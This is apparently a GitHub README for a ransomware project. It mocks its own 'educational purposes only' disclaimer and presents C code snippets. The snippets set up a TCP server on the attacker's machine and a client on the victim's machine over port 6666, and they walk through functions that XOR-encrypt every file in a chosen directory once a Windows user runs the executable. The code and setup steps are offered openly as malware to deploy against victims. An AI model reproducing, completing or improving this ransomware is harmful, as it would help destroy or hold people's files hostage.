# Final Ransomware
it's bait, this is not a ransomware "gui単o" gui単o".
(developed for educational purposes only, "gui単o" "gui単o").

This ransomware works along with TCP sockets in C, basically if you have the executable file in your devie (Windows OS) and you clicked on it, some 
random (or not that random) directory specified in the script will be encrypted with XoR.

## Setups

### IP  of the server (your device, the hacker, cracker, wareva) and port to host the comunication in the 	[server.c ](https://github.com/Los-Hackers666/finalMalware/blob/main/server.c) file
```c
 server_addr.sin_family = AF_INET; // Declaring the type
 server_addr.sin_port = htons(6666); // Declaring the port number to listen on
 server_addr.sin_addr.s_addr = inet_addr("000.000.000.0"); // Declaring the host, your IP
 
 ```
 
 ### IP and port of the server in the victim script (must be the same as the previous step), declared in the 	[user.c](https://github.com/Los-Hackers666/finalMalware/blob/main/client.c) file
 
 ```c
 
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(6666);
    client_addr.sin_addr.s_addr = inet_addr("000.000.000.00");//The same IP of the hacker, the server, the wareva
 ```
## The logic behind the ransomware
### XoR encryption

The encryptDirectory functions recieve as a parameter some path to te folder to encrypt as well as a randomly generated key, this function verifies if the given path corresponds to a valid directory of files. Once the directory is verified, calls the encryptFile() function in order to encrypt the files on it

```c
void encryptDirectory(char* directoryPath, char key)
````

The encryptFile() fuhnction open and reads byte per byte each one of the files in the path given previously. Applies and XoR operation to encrypt every bite of the files

```c
  while (fscanf(file, "%c", &byte) > 0)
    {
        counter ++;
        //printf("%d, %d\n", byte, byte ^ key);
        // Encrypt this byte by xoring to the key
        byte ^= key;
        // Save this byte into temp file
        fprintf(tempFile, "%c", byte);
    }
  ```
